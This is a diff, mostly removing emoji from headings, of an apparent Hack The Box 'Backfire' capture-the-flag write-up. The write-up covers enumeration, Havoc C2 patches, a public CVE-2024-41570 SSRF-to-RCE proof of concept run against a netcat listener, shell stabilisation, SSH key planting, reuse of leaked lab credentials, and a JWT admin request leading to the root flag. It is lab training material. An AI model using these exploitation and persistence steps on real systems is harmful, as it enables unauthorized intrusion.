@@ -2,13 +2,13 @@
 
 ![HTB Logo](https://www.hackthebox.com/images/logo-htb.svg)
 
-## 🧠 Overview
+##  Overview
 
 **Backfire** is a medium-difficulty Linux machine on Hack The Box that challenges users with enumeration, exploitation, and privilege escalation techniques. The machine involves interacting with a Command and Control (C2) framework and leveraging vulnerabilities to gain unauthorized access.
 
 ---
 
-## 🔍 Enumeration
+##  Enumeration
 
 ### Nmap Scan
 
@@ -36,22 +36,22 @@ havoc.yaotl                                        17-Dec-2024 11:34     875
 ```
 The patch disables TLS by switching WebSocket connections from wss:// to ws:// in the client code and replacing RunTLS with Run in the server code to use unencrypted connections on port 40056. The disable_tls.patch indicates that TLS has been disabled for a WebSocket management port (40056), which only allows local connections. The havoc.yatol file provides configuration details for the Havoc C2 framework:
 
-### 🔧 TLS Disabled on WebSocket Port
+###  TLS Disabled on WebSocket Port
 
 To enable local, unencrypted communication with the Havoc teamserver (on port `40056`), the developers patched the source to disable TLS. This allowed connections via `ws://` instead of `wss://`, making it exploitable via SSRF.
 
-#### 🔍 Connector.cc (Client-Side Patch)
+####  Connector.cc (Client-Side Patch)
 
 ```diff
 - auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
 + auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
 ```
-🔍teamserver.go (Server-Side Patch)
+teamserver.go (Server-Side Patch)
 ```
 - if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
 + if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 ```
-### 🧠 Havoc Configuration Analysis
+###  Havoc Configuration Analysis
 
 The `havoc.yaotl` configuration file provides insight into how the Havoc C2 teamserver was set up and used internally. Key components of this file revealed valuable information that assisted in post-exploitation and lateral movement.
 ```
@@ -96,7 +96,7 @@ Listeners {
 This sent me through a bunch of holes and confused me too much. I had to get help -_- 
 This setup allowed me to **forward the local port**, authenticate as `sergej`, and interact with the Havoc C2 to execute commands.
 
-### ⚙️ Exploitation – SSRF to RCE
+###  Exploitation – SSRF to RCE
 Discovering the Havoc C2 profile prompted further investigation into potential exploits. A  reference was the GitHub repository `chebuya/Havoc-C2-SSRF-poc`, which focuses on CVE-2024-41570. By pairing this exploit with a shell payload, initial access can be gained. Need to research how to combine the two.
 
 Edit the `etc/host` file pointing it to backfire.htb
@@ -379,7 +379,7 @@ write_socket(socket_id, frame,message)
 ```
 (*** Line372 CHANGE ***)
 
-## 🔧Running the script  
+## Running the script  
 1.) Set up a listener:
 ```
 nc -lnvp 40056
@@ -394,7 +394,7 @@ sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 ```
 (Note: Make sure they are in seperate terminals and run them all at once. I had to press them
 simultaneously)
-### 🧑‍💻My Machine 
+### My Machine 
 ```
 nc -lnvp 40056
 listening on [any] 40056 ...
@@ -423,7 +423,7 @@ sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 [***] Injecting Command ...
 [***] Success!
 ```
-### 🧑‍💻 Getting a Shell/User.txt
+###  Getting a Shell/User.txt
 After RCE, stabilize your shell using:
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -436,7 +436,7 @@ Add the public key to ~/.ssh/authorized_keys on the target and ssh into the mach
 ```
 ssh -i id_ed25519 ilya@<Target-IP>
 ```
-## 🪜 Privilege Escalation
+##  Privilege Escalation
 Switch to another user using leaked creds:
 User: `sergej`
 Pass: `1w4nt2sw1tch2h4rdh4tc2`
@@ -457,13 +457,13 @@ Use the JWT to access admin functions:
 ```
 curl -H "Authorization: Bearer <TOKEN>" http://127.0.0.1:5000/admin
 ```
-## 🔐 Root Flag
+##  Root Flag
 After getting admin access:
 ```
 cat /root/root.txt
 ```
 
-## ✅ Conclusion
+##  Conclusion
 This box was rated MEDIUM on HackTheBox, but as always, "medium" doesn’t quite capture the challenge — it took me over five days to even break the initial SSRF_RCE.py script.
 The key takeaways from this experience were the importance of persistence, the true power of SSRF leading to RCE, local privilege escalation through misconfigurations, and practical applications of JWTs in exploitation.
 I hope you find this writeup insightful and enjoyable!
